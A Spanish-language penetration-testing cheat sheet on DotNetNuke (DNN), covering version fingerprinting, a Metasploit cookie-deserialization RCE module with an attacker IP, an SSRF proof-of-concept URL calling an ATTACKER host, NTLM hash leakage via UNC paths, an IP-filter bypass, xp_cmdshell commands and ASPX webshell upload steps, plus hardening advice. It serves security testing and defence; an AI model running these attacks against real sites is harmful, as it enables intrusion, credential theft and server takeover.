# DotNetNuke (DNN)

{{#include ../../banners/hacktricks-training.md}}

## DotNetNuke (DNN)

Si ingresas como **administrador** en DNN, es fácil obtener **RCE**, sin embargo, se han publicado una serie de técnicas *no autenticadas* y *post-autenticación* en los últimos años. La siguiente hoja de trucos recopila las primitivas más útiles tanto para el trabajo ofensivo como defensivo.

---
## Enumeración de Versión y Entorno

* Verifica el encabezado de respuesta HTTP *X-DNN* – generalmente revela la versión exacta de la plataforma.
* El asistente de instalación filtra la versión en `/Install/Install.aspx?mode=install` (accesible en instalaciones muy antiguas).
* `/API/PersonaBar/GetStatus` (9.x) devuelve un blob JSON que contiene `"dnnVersion"` para usuarios de bajo privilegio.
* Cookies típicas que verás en una instancia en vivo:
* `.DOTNETNUKE` – ticket de autenticación de formularios ASP.NET.
* `DNNPersonalization` – contiene datos de perfil de usuario en XML/serializados (versiones antiguas – ver RCE a continuación).

---
## Explotación No Autenticada

### 1. RCE por Deserialización de Cookies (CVE-2017-9822 y seguimientos)
*Versiones afectadas ≤ 9.3.0-RC*

`DNNPersonalization` se deserializa en cada solicitud cuando el controlador 404 incorporado está habilitado. XML elaborado puede, por lo tanto, llevar a cadenas de gadgets arbitrarias y ejecución de código.
```
msf> use exploit/windows/http/dnn_cookie_deserialization_rce
msf> set RHOSTS <target>
msf> set LHOST  <attacker_ip>
msf> run
```
El módulo elige automáticamente el camino correcto para versiones parcheadas pero aún vulnerables (CVE-2018-15811/15812/18325/18326). La explotación funciona **sin autenticación** en 7.x–9.1.x y con una cuenta de *bajo privilegio* *verificada* en 9.2.x+.

### 2. Server-Side Request Forgery  (CVE-2025-32372)
*Versiones afectadas < 9.13.8  –  Parche lanzado en abril de 2025*

Un bypass de la solución anterior de `DnnImageHandler` permite a un atacante forzar al servidor a emitir **solicitudes GET arbitrarias** (SSRF semi-ciego). Impactos prácticos:

* Escaneo de puertos internos / descubrimiento de servicios de metadatos en implementaciones en la nube.
* Alcanzar hosts que de otro modo estarían protegidos por un firewall desde Internet.

Prueba de concepto (reemplazar `TARGET` & `ATTACKER`):
```
https://TARGET/API/RemoteContentProxy?url=http://ATTACKER:8080/poc
```
La solicitud se activa en segundo plano; monitorea tu listener para callbacks.

### 3. Exposición de Hash NTLM a través de Redirección UNC (CVE-2025-52488)
*Versiones afectadas 6.0.0 – 9.x (< 10.0.1)*

Contenido especialmente diseñado puede hacer que DNN intente obtener un recurso utilizando una **ruta UNC** como `\\attacker\share\img.png`. Windows realizará felizmente la negociación NTLM, filtrando los hashes de la cuenta del servidor al atacante. Actualiza a **10.0.1** o desactiva SMB saliente en el firewall.

### 4. Bypass de Filtro IP (CVE-2025-52487)
Si los administradores dependen de *Filtros de Host/IP* para la protección del portal de administración, ten en cuenta que las versiones anteriores a **10.0.1** pueden ser eludidas manipulando `X-Forwarded-For` en un escenario de proxy inverso.

---
## Post-Autenticación a RCE

### A través de la consola SQL
Bajo **`Settings → SQL`** una ventana de consulta integrada permite la ejecución contra la base de datos del sitio. En Microsoft SQL Server puedes habilitar **`xp_cmdshell`** y generar comandos:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
xp_cmdshell 'whoami';
```
### Carga de webshell vía ASPX
1. Ve a **`Settings → Security → More → More Security Settings`**.
2. Agrega `aspx` (o `asp`) a **Allowable File Extensions** y **Save**.
3. Navega a **`/admin/file-management`** y sube `shell.aspx`.
4. Actívalo en **`/Portals/0/shell.aspx`**.

---
## Escalamiento de privilegios en Windows
Una vez que se logra la ejecución de código como **IIS AppPool\<Site>**, se aplican técnicas comunes de escalamiento de privilegios en Windows. Si la máquina es vulnerable, puedes aprovechar:

* **PrintSpoofer** / **SpoolFool** para abusar de *SeImpersonatePrivilege*.
* **Juicy/Sharp Potatoes** para escapar de *Service Accounts*.

---
## Recomendaciones de endurecimiento (Blue Team)

* **Upgrade** a al menos **9.13.9** (soluciona el bypass de SSRF) o preferiblemente **10.0.1** (problemas de filtro IP y NTLM).
* Elimina los archivos residuales **`InstallWizard.aspx*`** después de la instalación.
* Desactiva el egress SMB saliente (puertos 445/139).
* Aplica filtros de *Host Filters* fuertes en el proxy de borde en lugar de dentro de DNN.
* Bloquea el acceso a `/API/RemoteContentProxy` si no se utiliza.

## Referencias

* Documentación del módulo `dnn_cookie_deserialization_rce` de Metasploit – detalles prácticos de RCE no autenticado (GitHub).
* Aviso de seguridad de GitHub GHSA-3f7v-qx94-666m – información sobre el bypass de SSRF de 2025 y parches.
{{#include ../../banners/hacktricks-training.md}}
